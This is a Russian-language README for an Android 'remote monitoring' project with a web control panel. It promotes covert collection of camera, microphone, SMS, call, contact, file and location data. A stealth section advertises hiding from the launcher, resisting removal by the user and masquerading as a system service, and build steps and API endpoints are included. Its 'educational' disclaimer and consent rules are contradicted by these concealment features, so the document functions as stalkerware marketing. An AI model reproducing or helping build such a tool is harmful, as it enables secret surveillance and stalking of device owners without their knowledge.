# 📱 Android Remote Monitoring System

<div align="center">

![Android](https://img.shields.io/badge/Android-5.0%20to%2014-brightgreen)
![API](https://img.shields.io/badge/API-21%20to%2034-blue)
![Stealth](https://img.shields.io/badge/Mode-Stealth%20Ready-red)
![Educational](https://img.shields.io/badge/Purpose-Educational-orange)

**Комплексная система удаленного мониторинга Android устройств**

[🚀 Установка](#установка) • [📖 Документация](#документация) • [🔧 API](#api) • [⚖️ Этика](#этика-использования)

</div>

---

## 🎯 О проекте

Это образовательный проект для изучения возможностей Android API в области мониторинга и удаленного управления устройствами. Система демонстрирует современные подходы к разработке Android приложений с поддержкой всех версий от Android 5.0 до Android 14.

### ✨ Ключевые особенности

- 📷 **Камера**: Фото, видео, стриминг (Camera & Camera2 API)
- 🎤 **Аудио**: Запись, стриминг, двусторонняя связь
- 📁 **Файлы**: Полный доступ к файловой системе
- 💬 **Связь**: SMS, звонки, контакты  
- 🖥️ **Система**: Детальная телеметрия устройства
- 🎮 **Управление**: Местоположение, настройки, административные функции
- 🕵️ **Стелс режим**: Скрытая работа в фоне после установки
- 🌐 **Веб-панель**: Real-time управление через браузер

### 🔐 Стелс функции

- ✅ Автоматическое скрытие с рабочего стола
- ✅ Запуск при загрузке системы  
- ✅ Самовосстановление при сбоях
- ✅ Защита от остановки пользователем
- ✅ Постоянная работа в фоне
- ✅ Маскировка под системные службы

## 🏗️ Архитектура

### 📱 Android компоненты

| Компонент | Описание | API Level |
|-----------|----------|-----------|
| `PermissionManager` | Универсальная система разрешений | 21-34 |
| `CameraManager` | Camera/Camera2 API с адаптацией | 21-34 |
| `AudioManager` | Запись и стриминг аудио | 21-34 |
| `FileManager` | Работа с файловой системой | 21-34 |
| `CommunicationManager` | SMS, звонки, контакты | 21-34 |
| `SystemMonitor` | Телеметрия системы | 21-34 |
| `RemoteController` | Удаленное управление | 21-34 |
| `StealthService` | Скрытая работа в фоне | 21-34 |

### 🌐 Веб-панель

- **Frontend**: HTML5, CSS3, JavaScript (ES6+)
- **Backend**: Node.js, Express, WebSocket
- **Database**: SQLite/PostgreSQL
- **Real-time**: Socket.io для live мониторинга

## 📊 Совместимость

<div align="center">

| Android Version | API Level | Support Status |
|----------------|-----------|----------------|
| Android 5.0    | 21        | ✅ Full |
| Android 6.0    | 23        | ✅ Full |  
| Android 7.0    | 24        | ✅ Full |
| Android 8.0    | 26        | ✅ Full |
| Android 9.0    | 28        | ✅ Full |
| Android 10     | 29        | ✅ Full |
| Android 11     | 30        | ✅ Full |
| Android 12     | 31        | ✅ Full |
| Android 13     | 33        | ✅ Full |
| Android 14     | 34        | ✅ Full |

</div>

### 📦 Кастомные ROM

- ✅ **LineageOS** - Полная совместимость
- ✅ **GrapheneOS** - С учетом дополнительной безопасности
- ✅ **/e/ OS** - Privacy-focused адаптация
- ✅ **CalyxOS** - Поддержка открытых стандартов
- ✅ **AOSP** - Базовая поддержка

## 🚀 Установка

### 📱 Android приложение

```bash
# Клонирование репозитория
git clone https://github.com/ReliableSecurity/android-remote-monitoring.git
cd android-remote-monitoring/android-app

# Открытие в Android Studio
# File -> Open -> Выбрать папку android-app
# Build -> Make Project
# Run -> Run 'app'
```

### 🌐 Веб-панель

```bash
cd web-control-panel

# Установка зависимостей
npm install

# Настройка конфигурации
cp config/config.example.js config/config.js
nano config/config.js

# Запуск в режиме разработки
npm run dev

# Производственная сборка
npm run build
npm start
```

## 📖 Документация

- 📋 [**Архитектура системы**](docs/ARCHITECTURE.md)
- 🔧 [**Руководство по установке**](docs/INSTALLATION.md)
- 🕵️ [**Стелс функции**](README_STEALTH.md)
- 📱 [**Обновление до Android 14**](docs/ANDROID_14_UPGRADE.md)
- 🔐 [**Система разрешений**](docs/PERMISSIONS.md)
- 🌐 [**API веб-панели**](docs/WEB_API.md)

## 🔧 API

### 📱 Android API Endpoints

```java
// Системная информация
systemMonitor.getSystemInfo()
systemMonitor.getBatteryInfo()
systemMonitor.getMemoryInfo()

// Камера
cameraManager.takePhoto()
cameraManager.recordVideo()
cameraManager.startStreaming()

// Местоположение  
remoteController.getCurrentLocation()
remoteController.trackLocation()

// Файлы
fileManager.listFiles("/sdcard")
fileManager.uploadFile(path, base64Data)
```

### 🌐 Web API Endpoints

```javascript
// REST API
GET    /api/devices          // Список устройств
GET    /api/device/:id       // Информация об устройстве  
POST   /api/device/:id/cmd   // Выполнить команду
GET    /api/device/:id/files // Файловый браузер

// WebSocket Events
device.connected    // Устройство подключено
device.location     // Обновление местоположения  
device.status       // Статус системы
device.file         // Файловые операции
```

## ⚖️ Этика использования

### ⚠️ Важные предупреждения

> **🚨 ОБРАЗОВАТЕЛЬНЫЙ ПРОЕКТ**: Этот код предназначен исключительно для образовательных целей и изучения Android API.

### ✅ Разрешенное использование

- 📚 **Обучение** - Изучение Android разработки
- 🔬 **Исследования** - Анализ безопасности мобильных систем  
- 🧪 **Тестирование** - На собственных устройствах
- 🏢 **Корпоративное** - С согласия сотрудников и соблюдением политик

### ❌ Запрещенное использование

- 🕵️ **Шпионаж** без согласия владельца
- 💼 **Корпоративное** шпионаж без разрешений  
- 🏠 **Домашнее** наблюдение без согласия
- 🎯 **Преследование** или стокинг
- 💰 **Коммерческое** использование в незаконных целях

### 🔒 Требования безопасности

1. **Явное согласие** всех пользователей устройств
2. **Полное раскрытие** функциональности при установке
3. **Соблюдение** местного законодательства  
4. **Защита данных** согласно GDPR и аналогичным нормам
5. **Ответственное использование** в образовательных целях

## 👨‍💻 Автор и контакты

<div align="center">

**🔒 ReliableSecurity**

[![GitHub](https://img.shields.io/badge/GitHub-ReliableSecurity-blue?logo=github)](https://github.com/ReliableSecurity)
[![Telegram](https://img.shields.io/badge/Telegram-@ReliableSecurity-blue?logo=telegram)](https://t.me/ReliableSecurity)

*Специалист по информационной безопасности и Android разработке*

</div>

### 🤝 Вклад в проект

Приветствуются:
- 🐛 Сообщения об ошибках
- 💡 Предложения улучшений  
- 📚 Улучшения документации
- 🔧 Pull requests с новыми функциями

### 📞 Связь

- **GitHub Issues**: Для технических вопросов
- **Telegram**: [@ReliableSecurity](https://t.me/ReliableSecurity) - для обсуждения проекта
- **Email**: Через профиль GitHub

## 📄 Лицензия

```
MIT License - Educational Use

Copyright (c) 2024 ReliableSecurity

Разрешается использование исключительно в образовательных целях
с полным соблюдением этических норм и местного законодательства.

Автор не несет ответственности за неэтичное использование этого кода.
```

---

<div align="center">

**⭐ Если проект полезен для обучения - поставьте звездочку!**

**📚 Создано для образовательных целей с любовью к Android разработке**

</div>